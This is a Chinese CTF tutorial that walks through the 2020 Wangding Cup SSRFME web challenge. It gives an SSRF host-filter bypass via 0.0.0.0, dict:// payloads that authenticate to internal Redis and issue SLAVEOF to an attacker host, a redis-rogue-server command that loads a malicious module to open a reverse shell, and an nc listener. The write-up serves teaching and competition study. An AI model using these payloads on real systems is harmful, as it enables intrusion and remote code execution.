# CTF-Web历年考题精讲教程：P8：网鼎杯2020玄武组WEB题SSRFME解题 🔐

![](img/286cec3d6ec98a2c7038f3d880888523_1.png)

![](img/286cec3d6ec98a2c7038f3d880888523_3.png)

在本节课中，我们将要学习如何解决一道来自“网鼎杯2020玄武组”的高难度CTF-Web题目——SSRFME。这道题综合了SSRF（服务器端请求伪造）、Redis未授权访问与主从复制漏洞利用等多种技术，当时仅有不到20支队伍成功解出。我们将从环境搭建开始，逐步分析代码逻辑，并最终利用漏洞获取服务器上的flag。

## 环境与题目概述 🎯

首先，我们需要访问目标网站。题目环境是一个模拟的Web应用，其核心是一个存在SSRF漏洞的页面。我们的目标是利用这个漏洞，结合内网的Redis服务，最终在服务器上执行任意命令。

题目提供的源代码包含关键的安全检查逻辑，我们需要绕过这些限制。

## 代码逻辑分析与绕过思路 💡

上一节我们介绍了题目环境，本节中我们来看看具体的代码逻辑和我们的绕过思路。

核心的PHP代码如下（关键部分）：

```php
if(isset($_GET['url'])){
    $url = $_GET['url'];
    if(empty($url)){
        die('url is empty');
    }
    // 检查URL的host部分
    $host = parse_url($url, PHP_URL_HOST);
    if($host === '127.0.0.1' || $host === 'localhost' || preg_match('/^192\.168\./', $host) || preg_match('/^10\./', $host)){
        die('host not allowed');
    }
    // 其他处理逻辑...
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    echo $result;
}
```

![](img/286cec3d6ec98a2c7038f3d880888523_5.png)

代码逻辑如下：
1.  获取用户传入的`url`参数。
2.  检查`url`的host部分。如果host是`127.0.0.1`、`localhost`或属于内网IP段（`192.168.*`， `10.*`），则直接拒绝请求。
3.  如果通过检查，则使用cURL发起请求并返回结果。

![](img/286cec3d6ec98a2c7038f3d880888523_7.png)

我们的目标是访问一个位于`http://127.0.0.1/secret.txt`的文件，该文件包含了Redis的密码。但由于上述过滤，直接访问会被阻止。

![](img/286cec3d6ec98a2c7038f3d880888523_9.png)

![](img/286cec3d6ec98a2c7038f3d880888523_11.png)

**绕过方法**：我们可以使用`0.0.0.0`这个特殊的IP地址。在某些配置下，`0.0.0.0`会被解析为本机，但可能绕过简单的字符串匹配过滤。因此，构造Payload：`?url=http://0.0.0.0/secret.txt`。

![](img/286cec3d6ec98a2c7038f3d880888523_12.png)

![](img/286cec3d6ec98a2c7038f3d880888523_13.png)

![](img/286cec3d6ec98a2c7038f3d880888523_15.png)

访问后，我们得到了Redis的密码：`redispasswordssm63p9`。

## 探测与利用Redis服务 ⚙️

![](img/286cec3d6ec98a2c7038f3d880888523_17.png)

上一节我们成功绕过了host检查并获取了Redis密码，本节中我们来看看如何探测和利用内网的Redis服务。

![](img/286cec3d6ec98a2c7038f3d880888523_19.png)

![](img/286cec3d6ec98a2c7038f3d880888523_21.png)

首先，我们需要确认内网是否存在Redis服务以及其端口。通常Redis默认端口是6379。我们可以利用SSRF，结合`dict`协议来探测服务。

**探测Payload**：`?url=dict://0.0.0.0:6379/`

![](img/286cec3d6ec98a2c7038f3d880888523_23.png)

![](img/286cec3d6ec98a2c7038f3d880888523_25.png)

![](img/286cec3d6ec98a2c7038f3d880888523_27.png)

如果返回包含`NOAUTH`等字样，则证明Redis服务存在且需要认证。这正是我们遇到的情况。

![](img/286cec3d6ec98a2c7038f3d880888523_29.png)

![](img/286cec3d6ec98a2c7038f3d880888523_31.png)

![](img/286cec3d6ec98a2c7038f3d880888523_33.png)

由于Redis服务只允许本地访问，我们必须通过Web服务器的SSRF漏洞作为跳板来与其交互。这里我们需要利用Redis的主从复制漏洞。漏洞原理是：我们可以伪装成一个Redis主服务器（Master），诱使目标Redis服务器（Slave）向我们同步数据。我们可以将同步的数据设置为一个恶意的`.so`扩展模块，从而在目标服务器上加载并执行任意代码。

![](img/286cec3d6ec98a2c7038f3d880888523_35.png)

以下是利用步骤的核心概述：

![](img/286cec3d6ec98a2c7038f3d880888523_37.png)

![](img/286cec3d6ec98a2c7038f3d880888523_38.png)

1.  **搭建恶意Redis主服务器**：在自己的攻击机上运行一个修改过的Redis服务，用于提供恶意的`exp.so`文件。
2.  **通过SSRF触发主从复制**：利用Web应用的SSRF漏洞，向目标Redis发送`SLAVEOF`命令，将其设置为向我们攻击机的主Redis同步数据。
3.  **加载恶意模块并执行命令**：在数据同步完成后，通过发送Redis命令，加载同步过去的`exp.so`模块，并执行其中的反弹Shell命令。

![](img/286cec3d6ec98a2c7038f3d880888523_40.png)

![](img/286cec3d6ec98a2c7038f3d880888523_42.png)

## 漏洞利用实战：获取Shell 🚀

![](img/286cec3d6ec98a2c7038f3d880888523_44.png)

![](img/286cec3d6ec98a2c7038f3d880888523_46.png)

上一节我们介绍了利用Redis主从复制漏洞的原理，本节我们进行实战操作，一步步获取反向Shell。

![](img/286cec3d6ec98a2c7038f3d880888523_48.png)

![](img/286cec3d6ec98a2c7038f3d880888523_50.png)

![](img/286cec3d6ec98a2c7038f3d880888523_51.png)

首先，需要在攻击机（例如Kali Linux）上准备利用脚本和恶意`exp.so`文件。一个常用的工具是`redis-rogue-server`。

![](img/286cec3d6ec98a2c7038f3d880888523_53.png)

![](img/286cec3d6ec98a2c7038f3d880888523_55.png)

**步骤一：启动恶意Redis主服务器**
在攻击机上运行以下命令，启动伪装的主服务器，并指定待同步的恶意模块。
```bash
python3 redis-rogue-server.py --server-host <攻击机IP> --server-port 21000 --lhost <攻击机IP> --lport 6666
```
参数说明：
*   `--server-host/port`: 恶意主Redis的地址和端口。
*   `--lhost/lport`: 接收反弹Shell的地址和端口。

![](img/286cec3d6ec98a2c7038f3d880888523_57.png)

![](img/286cec3d6ec98a2c7038f3d880888523_59.png)

![](img/286cec3d6ec98a2c7038f3d880888523_61.png)

**步骤二：通过SSRF发送SLAVEOF命令**
利用Web应用的SSRF漏洞，向目标Redis发送命令，将其设置为我们的从服务器。需要先进行认证。
Payload需要经过URL编码。
```
?url=dict://0.0.0.0:6379/AUTH%20redispasswordssm63p9
?url=dict://0.0.0.0:6379/SLAVEOF%20<攻击机IP>%2021000
```
如果返回`OK`，表示目标Redis已开始向我们的恶意主服务器同步数据。

![](img/286cec3d6ec98a2c7038f3d880888523_63.png)

![](img/286cec3d6ec98a2c7038f3d880888523_65.png)

**步骤三：等待同步并触发命令执行**
此时，攻击机上运行的`redis-rogue-server`脚本会自动处理后续流程：等待同步完成，然后通过发送`MODULE LOAD`等命令，让目标Redis加载`exp.so`并执行其中的反弹Shell代码。

![](img/286cec3d6ec98a2c7038f3d880888523_67.png)

![](img/286cec3d6ec98a2c7038f3d880888523_69.png)

![](img/286cec3d6ec98a2c7038f3d880888523_71.png)

**步骤四：接收反向Shell**
在攻击机上使用Netcat监听指定的端口（如6666），等待连接。
```bash
nc -lvnp 6666
```
成功接收到Shell后，我们就获得了目标服务器的命令执行权限。

![](img/286cec3d6ec98a2c7038f3d880888523_73.png)

![](img/286cec3d6ec98a2c7038f3d880888523_75.png)

## 寻找并获取Flag 🏁

![](img/286cec3d6ec98a2c7038f3d880888523_77.png)

上一节我们成功获取了目标服务器的Shell，本节我们最终定位并读取flag文件。

![](img/286cec3d6ec98a2c7038f3d880888523_79.png)

在获取的Shell中，我们可以浏览目录，寻找flag文件。常见的flag位置包括根目录`/`、当前Web目录、`/home`目录或以`flag`命名的文件。

使用以下命令进行查找：
```bash
ls -la /
find / -name “*flag*” 2>/dev/null
cat /flag
cat /flag.txt
```
在本题目环境中，最终在根目录找到了flag文件，使用`cat /flag`即可读取其中的内容。

![](img/286cec3d6ec98a2c7038f3d880888523_81.png)

![](img/286cec3d6ec98a2c7038f3d880888523_82.png)

## 总结 📝

![](img/286cec3d6ec98a2c7038f3d880888523_84.png)

![](img/286cec3d6ec98a2c7038f3d880888523_86.png)

![](img/286cec3d6ec98a2c7038f3d880888523_87.png)

本节课中我们一起学习了“网鼎杯2020玄武组”SSRFME题目的完整解法。我们回顾一下关键步骤：

![](img/286cec3d6ec98a2c7038f3d880888523_89.png)

![](img/286cec3d6ec98a2c7038f3d880888523_91.png)

1.  **代码审计与绕过**：分析了SSRF过滤逻辑，使用`0.0.0.0`绕过本地host限制，读取到Redis密码。
2.  **服务探测**：利用`dict`协议通过SSRF探测并确认内网Redis服务。
3.  **漏洞利用**：深入利用了Redis未授权访问及主从复制漏洞。我们在攻击机搭建恶意Redis主服务器，通过SSRF发送`SLAVEOF`命令控制目标Redis，使其同步恶意`.so`模块，最终实现远程代码执行，获得反向Shell。
4.  **获取Flag**：在获得的Shell中定位并读取flag文件。

![](img/286cec3d6ec98a2c7038f3d880888523_93.png)

![](img/286cec3d6ec98a2c7038f3d880888523_95.png)

这道题目难度较高，巧妙地将SSRF与Redis数据库的深度漏洞结合，需要参赛者具备扎实的协议知识、代码审计能力和漏洞利用技巧。希望本教程能帮助你理解这些关键知识点。